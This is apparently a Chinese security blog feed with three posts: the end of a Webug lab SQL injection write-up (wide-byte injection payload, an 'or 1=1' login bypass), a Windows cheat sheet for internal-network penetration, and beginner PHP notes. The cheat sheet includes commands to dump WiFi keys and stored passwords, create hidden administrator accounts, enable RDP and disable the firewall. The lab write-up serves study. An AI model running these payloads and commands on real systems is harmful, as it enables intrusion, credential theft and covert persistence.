<img src="/posts/dfca0ed5/7.png" class="" title="This is an 7 image">
<p>由于单引号被/转义了，所以我们需要加上%df，字符%bf在满足上述条件的情况下会变成%bf’。<br>其中反斜杠（\）的十六进制编码是%5C，单引号（’）的十六进制编码是%27<br>那么就可以得出%bf ‘=%bf%5c%27<br>如果程序的默认字符集是GBK等宽字节字符集，<br>则MySQL会认为%bf%5c是一个宽字符，也就是“縗”<br>也就是说%bf ‘=%bf%5c%27=縗’</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">width_byte_injection.php?id=<span class="number">-1</span>%df' union select <span class="number">1</span>,<span class="number">2</span> --+</span><br></pre></td></tr></table></figure>
<p>发现2为显示位</p>
<img src="/posts/dfca0ed5/8.png" class="" title="This is an 8 image">

<h2 id="万能密码登录"><a href="#万能密码登录" class="headerlink" title="万能密码登录"></a>万能密码登录</h2><p>账号 ‘or 1=1 or’<br>密码随便打 即可</p>
]]></content>
      <categories>
        <category>Webug 靶场</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>SQLMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows常用命令</title>
    <url>/posts/843f3569.html</url>
    <content><![CDATA[<h2 id="内网渗透命令"><a href="#内网渗透命令" class="headerlink" title="内网渗透命令"></a>内网渗透命令</h2><h3 id="查询命令"><a href="#查询命令" class="headerlink" title="查询命令"></a>查询命令</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">tree  <span class="string">//</span>树形文件结构</span><br><span class="line">dir  <span class="string">//</span>查看目录</span><br><span class="line">ipconfig <span class="string">/all</span>    <span class="string">//</span>查看ip</span><br><span class="line">whoami  <span class="string">//</span> 查看当前用户在系统中的权限</span><br><span class="line">systeminfo  <span class="string">//</span>查询系统以及补丁信息</span><br><span class="line">tasklist    <span class="string">//</span>查看本机任务列表</span><br><span class="line">tasklist <span class="string">/svc</span>   <span class="string">//</span>查看进程、pid及服务名</span><br><span class="line">wmic qfe  get hotfixid    <span class="string">//</span>查看已安装过得补丁</span><br><span class="line">net start   <span class="string">//</span>查看当前运行的服务</span><br><span class="line">net user      <span class="string">//</span>查看本地组的用户</span><br><span class="line">net localhroup administrators   <span class="string">//</span>查看本机管理员组有哪些用户</span><br><span class="line">net localgroup   <span class="string">//</span>查看所有组名</span><br><span class="line">net localgroup <span class="string">"Administrators"</span> <span class="string">//</span>查看指定组中的成员</span><br><span class="line">net user 用户名  <span class="string">//</span>查看账户的属性</span><br><span class="line">hostname     <span class="string">//</span>查看机器名</span><br><span class="line">net use      <span class="string">//</span>查看会话</span><br><span class="line">net session     <span class="string">//</span>查看当前会话</span><br><span class="line">net share       <span class="string">//</span>查看SMB指向的路径[即共享]</span><br><span class="line">wmic share get name,path   <span class="string">//</span>查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable <span class="string">//</span>查询系统日志文件存储位置</span><br><span class="line">netstat  -ano      <span class="string">//</span>查看开放的端口</span><br><span class="line">netstat -ano | findstr 端口  <span class="string">//</span>对想看的端口做截取</span><br><span class="line">tasklist | findstr 端口  <span class="string">//</span>查看某PID的服务是什么进程</span><br><span class="line">net accounts      <span class="string">//</span>查看本地密码策略</span><br><span class="line">net view    <span class="string">//</span>查看局域网内其他计算机名称</span><br><span class="line"><span class="keyword">echo</span> %PROCESSOR_ARCHITECTURE%         <span class="string">//</span>查看系统是32还是64位</span><br><span class="line"><span class="keyword">set</span>                              <span class="string">//</span>查看系统环境设置变量</span><br><span class="line">path        <span class="string">//</span>获取系统环境变量信息</span><br><span class="line">wmic startup list brief       <span class="string">//</span>查看启动程序信息</span><br><span class="line">wmic product list brief            <span class="string">//</span>查看安装程序和版本信息（漏洞利用线索）</span><br><span class="line">wmic startup list full <span class="string">//</span>识别开机启动的程序</span><br><span class="line">for <span class="string">/f</span> <span class="string">"skip=9 tokens=1,2 delims=:"</span> %i in <span class="params">('netsh wlan show profiles')</span> do @<span class="keyword">echo</span> %j | findstr -i -v <span class="keyword">echo</span> | netsh wlan show profiles %j key=<span class="keyword">clear</span>    <span class="string">//</span>一键获取wifi密码</span><br><span class="line"><span class="keyword">if</span> defined PSModulePath <span class="keyword">echo</span> <span class="params">(echo 支持powershell)</span> else <span class="params">(echo 不支持powershell)</span> </span><br><span class="line"><span class="string">//</span>查看是否支持posershell</span><br><span class="line">REG query HKCU  <span class="string">/v</span> <span class="string">"pwd"</span> <span class="string">/s</span>  <span class="string">//</span>获取保存到注册表中的密码</span><br><span class="line">arp -a          <span class="string">//</span>列出本网段内所有活跃的IP地址</span><br><span class="line">route print    <span class="string">//</span>打印路由表</span><br><span class="line">netsh firewall show config     <span class="string">//</span>显示防火墙配置</span><br><span class="line">netsh firewall show state    <span class="string">//</span> 显示当前防火墙状态　</span><br><span class="line">for <span class="string">/l</span> %i in <span class="params">(1,1,255)</span> do @ping 10.0.0.%i -w 1 -n 1 | find <span class="string">/i</span> <span class="string">"ttl"</span>   <span class="string">//</span>批量扫描内网存活主机</span><br><span class="line">dir <span class="string">/b/s</span> config.*              <span class="string">//</span>查看所在目录所有config.为前缀的文件</span><br><span class="line">findstr <span class="string">/si</span> password *<span class="string">.xml</span> *<span class="string">.ini</span> *<span class="string">.txt</span>     <span class="string">//</span>查看后缀名文件中含有password关键字的文件</span><br><span class="line">findstr <span class="string">/si</span> login *<span class="string">.xml</span> *<span class="string">.ini</span> *<span class="string">.txt</span>     <span class="string">//</span>查看后缀名文件中含有login关键字的文件</span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*.xml"</span>  <span class="string">//</span>在指定目录下搜集各种敏感文件</span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*.mdb"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*.sql"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*.mdf"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*.eml"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*.pst"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*conf*"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*bak*"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*pwd*"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*pass*"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*login*"</span></span><br><span class="line">dir <span class="string">/a</span> <span class="string">/s</span> <span class="string">/b</span> d:\<span class="string">"*user*"</span></span><br><span class="line">ping ip  / ping 域名      <span class="string">//</span>向对方主机发送数据，查看是否互通</span><br><span class="line">ver <span class="string">//</span>代码行显示 NT内核版本</span><br><span class="line">winver <span class="string">//</span>弹出界面 NT内核版本</span><br><span class="line">fsutil fsinfo drives  <span class="string">//</span>查看所有盘符</span><br><span class="line">driverquery  <span class="string">//</span>查看当前机器安装的驱动列表</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="修改命令"><a href="#修改命令" class="headerlink" title="修改命令"></a>修改命令</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">taskkill/pid 端口PID -t -f  <span class="string">//</span>杀死进程 -f 用来强制执行</span><br><span class="line">mstsc    <span class="string">//</span>远程桌面连接</span><br><span class="line"><span class="keyword">cd</span>  <span class="string">//</span>切换目录</span><br><span class="line">mkdir  <span class="string">//</span>创建目录</span><br><span class="line">type nul&gt;1.txt <span class="string">//</span>创建空文件</span><br><span class="line"><span class="keyword">echo</span> 内容&gt;1.txt <span class="string">//</span>创建非空文件</span><br><span class="line">start 1.txt  <span class="string">//</span>打开文件</span><br><span class="line">type 1.txt  <span class="string">//</span>打开文件（在命令行中显示文件内容）</span><br><span class="line">copy 1.txt D:\       <span class="string">//</span>把目录中的1.txt复制到d盘下的2.txt</span><br><span class="line">move 1.txt D:\       <span class="string">//</span>把目录中的1.txt移动到d盘下</span><br><span class="line">net start 服务名    <span class="string">//</span>开启服务</span><br><span class="line">net stop 服务名    <span class="string">//</span>暂停某服务</span><br><span class="line">net user 用户名 密码 <span class="string">/add</span>  <span class="string">//</span>建立用户</span><br><span class="line">net user 用户名$ 密码 <span class="string">/add</span>  <span class="string">//</span>建立隐藏用户</span><br><span class="line">net user guest / active<span class="function">:yes</span>  <span class="string">//</span>激活guest用户</span><br><span class="line">net localgroup administrators 用户名 <span class="string">/add</span>  <span class="string">//</span>把用户添加到管理员中使其具有管理员权限</span><br><span class="line">net user guest 123456  <span class="string">//</span>用guest用户登录后将密码改为123456</span><br><span class="line">net password 密码    <span class="string">//</span>更改系统登陆密码</span><br><span class="line">del d:\ad\*.* <span class="string">/a</span> <span class="string">/s</span> <span class="string">/q</span> <span class="string">/f</span>  <span class="string">//</span>强制删除指定路径下的所有文件</span><br><span class="line">restart <span class="string">/r</span> <span class="string">/t</span> 0   <span class="string">//</span>立即重启当前机器</span><br><span class="line">attrib +s +h 文件  <span class="string">//</span>隐藏文件  +s 设置系统文件属性  +h 设置隐藏属性</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span>    <span class="string">//</span>开启3389端口</span><br><span class="line">netsh firewall <span class="keyword">set</span> opmode disable  <span class="string">//</span>关闭防火墙</span><br></pre></td></tr></table></figure>


















]]></content>
  </entry>
  <entry>
    <title>PHP学习笔记</title>
    <url>/posts/55d182ea.html</url>
    <content><![CDATA[<h3 id="php语法初步"><a href="#php语法初步" class="headerlink" title="php语法初步"></a>php语法初步</h3><pre><code>php是一种运行在服务器端的脚本语言，可以嵌入到HTML中</code></pre><a id="more"></a>
<h3 id="php代码标记"><a href="#php代码标记" class="headerlink" title="php代码标记"></a>php代码标记</h3><pre><code>在php历史发展中，可以使用多种标记来区分php脚本
asp标记：&lt;%php代码%&gt;
短标记：&lt;?php代码?&gt;
脚本标记：&lt;script language=&quot;php&quot;&gt;php代码&lt;/script&gt;
标准标记：&lt;?php php代码?&gt;     （常用）</code></pre><h3 id="php注释"><a href="#php注释" class="headerlink" title="php注释"></a>php注释</h3><pre><code>所有的代码在写的过程中都必须注释
php中注释分为两种：
    行注释：一次注释一行
        //：后面的内容都是注释
        #：同上
    块注释：一次注释多行
        /*注释*/:里面的内容全部注释</code></pre><h3 id="php语句分隔符"><a href="#php语句分隔符" class="headerlink" title="php语句分隔符"></a>php语句分隔符</h3><pre><code>语句分隔符：在PHP中，代码是一行为单位，系统需要通过判断行的结束，该结束通常都是一个符号“;”（英文状态下的分号）
特殊说明：
    1.php中标记结束符?&gt;有自带结束符的效果，最后一行php代码可以没有语句结束符“;”
    2.php中其实很多代码的书写并不是嵌入到HTML中，而是单独存在，通常书写习惯中就不建议用标记结束符?&gt;,php会自动从开始到最后全部认为是php代码，从而解析。</code></pre><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><pre><code>php是一种动态开发的脚本语言，动态语言特点是交互性，会有数据的传递，而php作为“中间人”，需要进行数据的传递，传递的前提就是php能自己存储数据（临时存储）</code></pre><h4 id="变量基本概念"><a href="#变量基本概念" class="headerlink" title="变量基本概念"></a>变量基本概念</h4><pre><code>变量来源于数学，是计算机语言中能存储计算结果或能表示值抽象概念，变量可以通过变量名访问，在指令式语言中，变量通常是可变的。</code></pre><h4 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h4><pre><code>php中的所有变量都必须使用&quot;$&quot;
1. 定义：在系统中增加对应的变量名字（内存）
2. 赋值：可以将变量赋值给变量名（可以在定义的同时完成）
3. 可以通过变量名访问存储的数据
4. 可以将变量从内存中删除</code></pre><h4 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h4><pre><code>1. 在php中变量名字必须以“$”符号开始
2. 名字由字母、数字和下划线“_”构成，但是不能以数字开头
3. 在php中本身还允许中文变量（不建议）</code></pre><h4 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h4><pre><code>预定义变量：提前定义的变量，系统定义的变量，存储许多需要用的数据（预定义变量都是数据）
$_POST    获取表单以get方式提交的数据
$_GET    post提交的数据都会保存在此
$_REQUEST    get和post提交的都会保存
$GLOBALS    php中所有的全局变量
$_SERVER    服务器信息
$_SESSION    session会话数据
$_COOKIE    cookie会话数据
$_ENV    环境信息
$_FLES    用户上传的文件信息</code></pre><h4 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h4><pre><code>可变变量：如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另一个变量的值：在变量前面再多加一个$符号
$a = &apos;b&apos;;
$b = &apos;bb&apos;;
那么$$a就等于bb</code></pre><h4 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h4><pre><code>将一个变量赋值给另外变量：变量传值
变量传值一共有两种方式：值传递，引用传递
值传递：将变量保存的值赋值一份，然后将新的值给另外一个变量保存（两个变量没有关系）
引用传递：将变量保存的值所在的内存地址，传递给另外一个变量：两个变量指向同一块内存空间（两个变量是同一个值）

&lt;?php
//php变量传值

//值传递
$a = 10;
$b = $a;
$b = 5;
echo $a,$b,&apos;&lt;br/&gt;&apos;;

//引用传递
$c = 10;
$d = &amp;$c;
$c = 5;
echo $c,$d,&apos;&lt;br/&gt;&apos;;
?&gt;
输出结果为  a = 10 , b = 5 , c = 5 , d = 5</code></pre><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><pre><code>常量与变量一样，都是用来保存数据的</code></pre><h4 id="常量基本概念"><a href="#常量基本概念" class="headerlink" title="常量基本概念"></a>常量基本概念</h4><pre><code>常量：是一种在程序运行当中，不可改变的量（数据）
常量一旦定义，通常数据不可改变（用户级别）</code></pre><h4 id="常量定义形式"><a href="#常量定义形式" class="headerlink" title="常量定义形式"></a>常量定义形式</h4><pre><code>1. 使用定义常量的函数：define(&apos;常量名&apos;,常量值);
2. 5.3之后才有的：const 常量名 = 值;</code></pre><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//使用函数定义常量：define</span></span></span><br><span class="line"><span class="php">define(<span class="string">'PI'</span>,<span class="number">3.14</span>);</span></span><br><span class="line"><span class="php"><span class="comment">//使用const关键字定义</span></span></span><br><span class="line"><span class="php"><span class="keyword">const</span> PII = <span class="number">3</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h4 id="常量名字的命名规则"><a href="#常量名字的命名规则" class="headerlink" title="常量名字的命名规则"></a>常量名字的命名规则</h4><pre><code>1. 常量不需要使用“$”符号，一旦使用系统就会认为是变量
2. 常量的名字组成由字母、数字、和下划线组成，不能以数字开头
3. 常量的名字通常是以大写字母为主(与变量以示区别)
4. 常量名名的规则比变量要松散，可以使用一些特殊字符，该方式只能使用define定义</code></pre><h4 id="常量适用形式"><a href="#常量适用形式" class="headerlink" title="常量适用形式"></a>常量适用形式</h4><pre><code>常量的使用与变量一样：不可改变值（在定义的时候必须赋值）</code></pre><p>说明：常量和变量的使用<br>    1. 凡是数据可能变化的，那么肯定是变量<br>    2. 数据不一定会变得，可以使用常量或者变量（变量居多）<br>    3. 数据不允许被修改的，一定用常量</p>
<h4 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h4><pre><code>系统常量：系统帮助用户定义的常量，用户可以直接使用</code></pre><h4 id="常用的几个系统常量"><a href="#常用的几个系统常量" class="headerlink" title="常用的几个系统常量"></a>常用的几个系统常量</h4><pre><code>PHP_VERSION:PHP版本号
PHP_INT_SIZE:整形大小
PHP_INT_MAX:整形能表示的最大值（PHP中整形是允许出现负数：带符号）</code></pre><p>在php中还有一些特殊的常量，他们有双下划线开始+常量名+双下划线结束，这种常量称之为系统魔术常量：魔术常量的值通常会跟着环境变化，但是用户改变不了<br>    <strong>DIR</strong>:当前被执行的脚本所在电脑的绝对路径<br>    <strong>FILE</strong>:当前被执行的脚本所在的电脑的绝对路径（带自己文件的名字）<br>    <strong>LINE</strong>:当前所属的行数<br>    <strong>NAMESPACE</strong>:当前所属的命名空间<br>    <strong>CLASS</strong>:当前所属的类<br>    <strong>METHOD</strong>:当前所属的方法</p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><pre><code>数据类型：data type,在php中指的是存储的数据本身的类型，而不是变量的类型，php是一种弱类型语言，变量本身没有数据类型</code></pre><h4 id="php的八种数据类型"><a href="#php的八种数据类型" class="headerlink" title="php的八种数据类型"></a>php的八种数据类型</h4><pre><code>在php中将数据分为三大类八小类：

简单（基本）数据类型：4个小类
整形：int 系统分配4个字节存储，表示整数类型（有前提）
浮点型：float 系统分配8个字节存储，表示小数或者整形存不下的整数
字符串型：string 系统根据实际长度分配，表示字符串(引号)
布尔类型：bool 表示布尔类型，只有两个值：true和false

复合数据类型：两个小类
对象类型：objict 存放对象（面对对象）
数组类型：array 存储多个数据（一次性）

特殊数据类型：2个小类
资源类型：resource 存放资源数据（php外部数据，如数据库、文件）
空类型：NULL，只有一个值就是NULL（不能运算）</code></pre><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><pre><code>类型转换：在很多的条件下，需要指定的数据类型，需要外部数据（当前php取得的数据），转换成目标数据类型
在php中有两种类型转换方式：
    1. 自动转换：系统根据需求自己判定，自己转换（用的比较多，效率偏低）
    2. 强制（手动）转换：认为根据需要的目标类型转换

    强制转换规则：在变量之前增加一个括号（），然后在里面写上对应类型：int 等等
    其中NULL类型用到unset()

在转换过程中，用得比较多的就是转布尔类型（判断）和转数值类型（算术运算）

其他类型转布尔类型：true或者false，在php中比较少类型会变成false

其他类型转数值的说明
    1. 布尔true为1，false为0
    2. 字符串转数值有自己的规则
        2.1 以字母开头的字符串，永远为0
        2.2 以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点）</code></pre><h4 id="数据类型判断"><a href="#数据类型判断" class="headerlink" title="数据类型判断"></a>数据类型判断</h4><pre><code>通过一组类型判断函数，来判断变量，最终返回这个变量所保存数据的数据类型（相同结果为true，不同为false）：是一组以is_开头后面跟类型名字的函数：is_XXX(变量名)
bool类型不能用echo来查看，可以使用var_dump结构查看
还有一组函数可以用来获取以及设定数据（变量）的类型
Gettype(变量名)：获取类型，得到的是该类型对应的字符串
Settype(变量名,类型):设定数据类型：与强制转换不同
    1. 强制转换（类型）变量名，是对数据值复制的内容进行处理（不会处理实际存储的内容）
    2.settype会直接改变数据本身</code></pre><h4 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h4><pre><code>整数类型：保存整数数值（范围限制）4个字节存储数字，最大就是32位 </code></pre><h4 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h4><h4 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h4><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>运算符：是一种将数据进行运算的特殊符号，在php中一共有十种运算符之多</p>
<h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p>符号是“=”表示将右边的结果赋值给左边（可以是变量、数据、常量和其他晕死出来的结果）</p>
<h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p>基本算术操作<br>    + 加<br>    - 减<br>    * 乘<br>    / 除<br>    % 取余</p>
<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p>比较运算：比较两个数据的大小，或者两个内部是否相同，返回的结果都是布尔类型：满足返回true，不满足返回false<br>    &gt;    左边大于右边，返回true<br>    &gt;=     大于等于<br>    &lt;    小于<br>    &lt;=    小于等于<br>    ==    相等（大小相同）<br>    !=    不等（大小不同）<br>    ===    全等于，大小以及数据的类型都要相同<br>    !== 不全等于，只有大小或者类型不同</p>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><pre><code>逻辑运算：针对不同的结果进行匹配
&amp;&amp;    逻辑与，左边的条件与右边的条件同时成立
||    逻辑或，左边的条件或者右边的条件只要有一个满足即可
！    逻辑非，对已有条件进行取反</code></pre><h4 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h4><pre><code>连接运算：是php中将多个字符串拼接的一种符号
.:将两个字符串连接到一起
.=:复合运算，将左边的内容与右边的内容连接起来，然后重新赋值给左边变量</code></pre><h4 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h4><pre><code>在PHP中有一些错误可以提前预知，但是这些错误可能无法避免，但是又比希望报错给用户看，可以使用错误抑制符处理。
@:在可能出错的表达式前面使用@符号即可。</code></pre><h4 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h4><pre><code>三目运算:有三个表达式参与的运算（简单的分支结构缩写）
语法格式：
    表达式1 ? 表达式2 : 表达式3;
运算：如果表达式1成立，那么执行表达式2，否则执行表达式3；</code></pre><h4 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h4><pre><code>自操作：自己操作自己的运算符
++：在原来的值上+1
--：在原来的值上-1
后置自操作：先把自己所保存的值留下来，然后改变自己，自己给别人的值是原来的值；
前置自操作：先把自己改变，然后把改变后的值给别人
衍生符号：类似自操作
+=
-=
*=
/=
%=</code></pre><h4 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h4><pre><code>计算机码：计算机在实际存储数据的时候，采用的编码规则（二进制规则）
计算机码：原码、反码、补码，数值本身最左边以为是用来充当符号位：正数为0，负数为1
原码：数据本身从十进制转换成二进制得到的结果
    正数：左边符号位为0
    负数：左边符号位为1
反码：针对负数，符号位不变，其他位取反
补码：针对负数，反码+1</code></pre><h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><pre><code>位运算：取出计算机中最小的单位（位 bit）进行运算
&amp;:按位与，两个位都为1，结果为1，否则为0
|:按位或，两个有一个为1，结果为1
~:按位非，一个位如果位1则变成0，否则反之
^:按位异或，两个相同则为0，不同则为1
&lt;&lt;:按位左移，整数位（32位），向左移动一位，右边补0
&gt;&gt;:按位右移，整个位向右移动一位，左边补符号位对应内容（正数补0，负数补1）
按位左移：乘以2的操作
按位右移：除以2的操作（不完全正确）：整数除以2会出现小数</code></pre><h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h4><pre><code>运算符优先级：在多种运算符同时存在的时候，如何结合运算</code></pre><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><pre><code>流程控制：代码执行的方向</code></pre><h4 id="控制分类"><a href="#控制分类" class="headerlink" title="控制分类"></a>控制分类</h4><pre><code>顺序结构：代码从上往下，顺序执行。（代码执行的最基本结构）
分支结构：给定一个条件，同时有多种可执行代码（块），然后会根据条件执行某一段代码
循环结构：在某个条件控制范围内，指定代码（块）可以重复执行</code></pre><h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><pre><code>顺序结构：最基本结构，所有代码默认都是从上往下依次执行</code></pre><h4 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h4><pre><code>在php中分支结构主要有两种：if分支和switch分支</code></pre><h4 id="if分支"><a href="#if分支" class="headerlink" title="if分支"></a>if分支</h4><pre><code>if：如果的意思，给定一个条件，同时为该条件设置多种（两种）情况，然后通过条件判断来实现具体的执行段

基本语法：if分支php也提供多种方式来实现
最简if：只有一段代码，但是可以选择是否执行
if(条件表达式){
    //满足条件所要执行的内容；//顺序结构
}

基础if：有两面性，满足条件或者不满足条件都有对应的执行代码
if(条件表达式){
    //满足条件后执行的代码段
}else{
    //不满足条件执行的代码段
}

复杂if结构：在判断条件之后，通常就有两种结果：满足或不满足，在不满足后还可以再次进行条件判断
if(条件表达式1){
    //满足条件表达式1的代码段
}elseif(条件表达式2){
    //不满足条件表达式1，但是满足条件表达式2的代码
}.....//可以使用多个elseif来进行再次条件筛选
else{
    //全部不满足要执行的代码
}</code></pre><h4 id="Switch分支"><a href="#Switch分支" class="headerlink" title="Switch分支"></a>Switch分支</h4><pre><code>switch分支：有一组情形存在，通过一个条件，通常有多个值，但是每一个值都会有对应不同的代码要执行，
switch判断方式：是将条件放到分支结构内部判断

switch基本语法：
switch(条件表达式){
    //所有条件判断：逐个进行
    Case值1:                        //当前条件表达式的结果与值1相等（==）
        要执行的代码段;
        Break;                    //在switch中，如果条件匹配成功，那么系统就不会再次匹配条件，会自动顺序向下的所有代码（case代码除外），需要终端执行：break表示中断switch（结束）。
    Case值2:
        要执行的代码段;
        break;


    //可以使用类似else的语法：都不匹配
    Default:
        //匹配失败的代码;
        Break;
}</code></pre><p>if 和 switch 的选择<br>1、 if能做所有的分支结构事情<br>2、 switch处理的是条件比较多，同时比较单一，而且是固定值匹配的分支结构</p>
<h4 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h4><pre><code>循环结构：代码段在一定的控制下，可以多次执行
在php中循环结构有以下几种：
    for循环：通过条件、起始和终止判断执行
    while循环：通过判断条件终止
    Do-while循环：跟while差不多
    Foreach循环：专门针对数组</code></pre><h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><pre><code>for循环基本语法
for(条件表达式1;条件表达式2;条件表达式3){
    //条件表达式1：定义初始化条件，可以有多种赋值语句存在，使用逗号分割即可
    //条件表达式2：边界判定，限定循环执行的次数
    //条件表达式3：用来执行条件变化
    //循环体
}

for循环执行原理：
1、 执行条件表达式1：定义初始化条件（执行一次）
2、 执行条件表达式2：判断条件（N次）
    2.1 满足条件：执行循环体
    2.2 不满足条件：循环结束
3、 执行循环体（N次）
4、 执行条件表达式3：循环标量变化（N次）
5、 重复执行2-4步，直到不满足条件结束循环</code></pre><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><pre><code>while循环基本语法：

条件初始化;
while(条件表达式){
    //条件表达式就是判断边界条件
    循环体;    //循环条件的变化
}</code></pre><p>for与while的选择<br>1、 如果是基于固定已知条件（数值而且是有规律的变化），使用for循环<br>2、 while可以做灵活的条件判定（while使用的比较多）</p>
<h4 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h4><pre><code>do-while：看着很像while，while首先进行条件判定然后执行循环体，有可能出现第一次就条件不满足那么就会直接失败（循环体一次都不执行）。do-while就是先干了再说（执行循环体），后判断条件。（至少会执行一次循环体）

do-while 基本语法：
do{
    //循环体
    }while(条件表达式);</code></pre><h4 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h4><pre><code>循环控制：在循环内部对循环本身进行控制
中断控制：重新开始循环，循环体中还有其他内容，也不再执行
continue 层级; //默认是1（循环可以多层嵌套）

终止控制：循环直接结束
break 层级;  //默认是1</code></pre><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$i = <span class="number">1</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">while</span>($i &lt;= <span class="number">100</span>)&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($i % <span class="number">5</span> != <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">		$i++;</span></span><br><span class="line"><span class="php">		<span class="comment">//重新循环</span></span></span><br><span class="line"><span class="php">		<span class="keyword">continue</span>;</span></span><br><span class="line"><span class="php">		<span class="comment">//结束循环</span></span></span><br><span class="line"><span class="php">		<span class="comment">//break;</span></span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $i++,<span class="string">'&lt;br/&gt;'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>因为循环经常性会碰到嵌套（循环中间包含循环），如果在循环内部有些条件下，明确可以知道当前循环（或者说外部循环）不需要继续执行了，那么就是可以使用循环控制来实现：其中内部循环也可以控制到外部，就是通过使用层级参数。<br>continue 2 ;   //当前自己循环后面内部不再执行，同时外部循环如果还有循环体也不再执行，重新来过；<br>break 2; //当前自己循环结束，同时外部也结束（如果还有外部不受影响，继续执行）</p>
<h4 id="流程控制替代语法"><a href="#流程控制替代语法" class="headerlink" title="流程控制替代语法"></a>流程控制替代语法</h4><pre><code>流程控制替代语法：分支和循环构造的替代语法
php本身是嵌入到HTML中的脚本语言，需要在HTML中书写一下关于判断或者循环的结构语法，必须符合PHP标签规范，需要html与php进行混搭，如果使用原始的php代码那么会非常不美观。</code></pre><p>需求：打印一个九九乘法表，使用表格来展示</p>
